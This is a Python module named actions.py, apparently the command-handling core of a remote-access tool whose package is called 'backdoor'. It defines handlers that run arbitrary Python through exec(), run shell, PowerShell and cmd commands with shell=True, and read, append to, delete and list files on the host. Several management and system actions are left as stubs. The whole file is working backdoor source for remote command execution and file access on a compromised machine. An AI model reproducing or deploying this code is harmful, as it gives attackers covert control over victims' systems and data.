# actions.py

import subprocess
import sys
import os
import threading
import time
from abc import ABCMeta
from io import StringIO
from typing import Callable, Literal

from backdoor.command import CommandCapsule
from backdoor.execution import SubProcess, SubThread
from backdoor.data import File, Format
from backdoor.labels import READ, WRITE, SEARCH, DELETE

__all__ = [
    "ExecutionAction",
    "Actions",
    "DataAction",
    "ManagementAction",
    "SystemAction"
]

JsonValue = str | bytes | dict | list | int | float | bool | None
ActionsDict = dict[str, Callable[[CommandCapsule], JsonValue]]

class BaseActionGroup(metaclass=ABCMeta):

    ACTIONS: ActionsDict

    def __init__(self) -> None:

        self.actions = self.ACTIONS.copy()

class ExecutionAction(BaseActionGroup):

    PYTHON = 'python'
    POWERSHELL = 'powershell'
    CMD = 'cmd'
    SHELL = 'shell'
    SLEEP = 'sleep'
    CUSTOM = 'custom'

    TYPE = 'execution'

    @staticmethod
    def _execute(
            capsul: CommandCapsule, execution: Callable[[], ...]
    ) -> dict[str, str]:

        wait = capsul.command.action.wait

        timeout = None
        executor = None

        saved_stdout = sys.stdout
        saved_stderr = sys.stderr

        out = sys.stdout = StringIO()
        err = sys.stderr = StringIO()

        result = {}

        if capsul.command.action.timeout is not None:
            timeout = capsul.command.action.timeout.total_seconds()

        finish = lambda: (
            result.update(dict(stdout=out.getvalue(), stderr=err.getvalue())),
            capsul.on_finish(capsul)
        )

        if capsul.command.action.thread or timeout:
            executor = SubThread(threading.Thread(target=execution))

            capsul.command.executions.append(executor)
            capsul.command.running = True

            executor.run()

            if wait:
                executor.timeout(timeout=timeout)

            else:
                timer = SubThread(
                    threading.Thread(
                        target=lambda: (
                            executor.timeout(timeout=timeout),
                            finish()
                        )
                    )
                )

                capsul.command.executions.append(timer)

                timer.run()

        else:
            execution()

        sys.stdout = saved_stdout
        sys.stderr = saved_stderr

        if wait and not (executor and executor.is_alive()):
            finish()

        return result

    @staticmethod
    def python(capsul: CommandCapsule) -> dict[str, str]:

        return ExecutionAction._execute(
            capsul, lambda: exec(capsul.command.request.data(), capsul.memory)
        )

    @staticmethod
    def shell(
            capsul: CommandCapsule,
            executor: None | str | Literal['powershell', 'cmd'] = None
    ) -> dict[str, str]:

        timeout = None

        if capsul.command.action.timeout is not None:
            timeout = capsul.command.action.timeout.total_seconds()

        script = capsul.command.request.data()

        args = [*([executor] if executor else []), script]

        process = SubProcess()

        execution = lambda: process.run(
            args, shell=True, capture_output=True,
            text=True, timeout=timeout
        )

        value = ExecutionAction._execute(capsul, execution)

        if isinstance(process.result, subprocess.CompletedProcess):
            value['stdout'] = process.result.stdout
            value['stderr'] = process.result.stderr

        return value

    @staticmethod
    def powershell(capsul: CommandCapsule) -> dict[str, str]:

        return ExecutionAction.shell(
            capsul, executor=ExecutionAction.POWERSHELL
        )

    @staticmethod
    def cmd(capsul: CommandCapsule) -> dict[str, str]:

        return ExecutionAction.shell(capsul, executor=None)

    @staticmethod
    def sleep(capsul: CommandCapsule) -> str:

        seconds = capsul.command.request.data()

        time.sleep(seconds)

        return f"Slept for {seconds} seconds."

    ACTIONS: ActionsDict = {
        PYTHON: python,
        POWERSHELL: powershell,
        CMD: cmd,
        SHELL: shell,
        SLEEP: sleep,
        CUSTOM: None
    }

class DataAction(BaseActionGroup):

    WRITE = WRITE
    READ = READ
    DELETE = DELETE
    SEARCH = SEARCH

    TYPE = 'data'

    @staticmethod
    def write(capsul: CommandCapsule) -> str:

        name = capsul.command.request.name

        capsul.memory[name] = capsul.command.request.data()

        return f"'{name}' was written to memory in memory."

    @staticmethod
    def search(capsul: CommandCapsule) -> bool:

        return capsul.command.request.name in capsul.memory

    @staticmethod
    def read(capsul: CommandCapsule) -> JsonValue:

        name = capsul.command.request.name

        if name not in capsul.memory:
            raise ValueError(f"'{name}' is not saved in memory.")

        return capsul.memory[name]

    @staticmethod
    def delete(capsul: CommandCapsule) -> str:

        name = capsul.command.request.name

        if name not in capsul.memory:
            raise ValueError(f"'{name}' is not saved in memory.")

        capsul.memory.pop(name)

        return f"'{name}' was deleted from memory."

    ACTIONS: ActionsDict = {
        WRITE: write,
        READ: read,
        SEARCH: search,
        DELETE: delete
    }

class FileAction(BaseActionGroup):

    READ = READ
    WRITE = WRITE
    DELETE = DELETE
    SEARCH = SEARCH
    TREE = 'tree'
    LIST = 'list'

    TYPE = 'file'

    @staticmethod
    def read(capsul: CommandCapsule) -> str | bytes:

        if not isinstance(capsul.command.request, File):
            raise ValueError('request data must be of type File.')

        path = capsul.command.request.name

        if not path or not isinstance(path, str) or not os.path.exists(path):
            raise ValueError(
                'request data name must be a valid existing file name.'
            )

        f = capsul.command.request.format

        if not f:
            f = Format.BYTES

        elif f not in Format.FORMATS:
            raise ValueError(
                f"File format must be one of: "
                f"'{', '.join(Format.FORMATS)}', not: '{f}'."
            )

        if f == Format.TEXT:
            f = 'r'

        elif f == Format.BYTES:
            f = 'rb'

        with open(path, f) as file:
            file.seek(capsul.command.request.position, 0)
            payload = file.read(capsul.command.request.buffer or -1)

        capsul.command.request.position += len(payload)
        capsul.command.request.size = os.path.getsize(path)

        return payload

    @staticmethod
    def write(capsul: CommandCapsule) -> str:

        if not isinstance(capsul.command.request, File):
            raise ValueError('request data must be of type File.')

        path = capsul.command.request.name

        if not path or not isinstance(path, str):
            raise ValueError('request data name must be a valid file name.')

        f = capsul.command.request.format

        if not f:
            f = Format.BYTES

        elif f not in Format.FORMATS:
            raise ValueError(
                f"File format must be one of: "
                f"'{', '.join(Format.FORMATS)}', not: '{f}'."
            )

        if f == Format.TEXT:
            f = 'a+'

        elif f == Format.BYTES:
            f = 'a+b'

        payload = capsul.command.request.data()

        with open(path, f) as file:
            file.seek(capsul.command.request.position, 0)
            file.write(payload)

        capsul.command.request.position += len(payload)
        capsul.command.request.size = os.path.getsize(path)

        return f"Data was added to the end of file: '{path}'."

    @staticmethod
    def delete(capsul: CommandCapsule) -> str:

        if not isinstance(capsul.command.request, File):
            raise ValueError('request data must be of type File.')

        path = capsul.command.request.name

        if not path or not isinstance(path, str) or not os.path.exists(path):
            raise ValueError(
                'request data name must be a valid existing file name.'
            )

        os.remove(path)

        return f"file: '{path}' was deleted."

    @staticmethod
    def search(capsul: CommandCapsule) -> bool:

        path = capsul.command.request.name

        if not path or not isinstance(path, str):
            raise ValueError('request data name must be a valid file name.')

        return os.path.exists(path)

    @staticmethod
    def list(capsul: CommandCapsule) -> list[str]:

        path = capsul.command.request.name

        if not path or not isinstance(path, str) or not os.path.isdir(path):
            raise ValueError('request data name must be a valid directory name.')

        return os.listdir(path)

    ACTIONS: ActionsDict = {
        READ: read,
        WRITE: write,
        DELETE: delete,
        SEARCH: search,
        LIST: list,
        TREE: None
    }

class SystemAction(BaseActionGroup):

    CD = 'cd'
    ROOT = 'root'
    CWD = 'cwd'

    TYPE = 'system'

    ACTIONS: ActionsDict = {
        CD: None,
        ROOT: None,
        CWD: None
    }

class ManagementAction(BaseActionGroup):

    RERUN = 'rerun'
    CLEAN = 'clean'
    LAST = 'last'
    COMMAND = 'command'
    STOP = 'stop'
    FORGET = 'forget'
    ADD = 'add'
    DELETE = 'delete'
    RUNNING = 'running'

    TYPE = 'management'

    ACTIONS: ActionsDict = {
        RERUN: None,
        CLEAN: None,
        LAST: None,
        COMMAND: None,
        STOP: None,
        FORGET: None,
        ADD: None,
        RUNNING: None
    }

class Actions:

    EXECUTION = ExecutionAction
    MANAGEMENT = ManagementAction
    DATA = DataAction
    SYSTEM = SystemAction
    FILE = FileAction

    ACTIONS: dict[str, ActionsDict] = {
        EXECUTION.TYPE: ExecutionAction.ACTIONS,
        MANAGEMENT.TYPE: ManagementAction.ACTIONS,
        DATA.TYPE: DataAction.ACTIONS,
        SYSTEM.TYPE: SYSTEM.ACTIONS,
        FILE.TYPE: FILE.ACTIONS
    }

    def __init__(self) -> None:

        self.execution = self.EXECUTION()
        self.management = self.MANAGEMENT()
        self.data = self.DATA()
        self.system = self.SYSTEM()
        self.file = self.FILE()

        self.actions: dict[str, ActionsDict] = {
            self.execution.TYPE: self.execution.actions,
            self.management.TYPE: self.management.actions,
            self.data.TYPE: self.data.actions,
            self.system.TYPE: self.system.actions,
            self.file.TYPE: self.file.actions
        }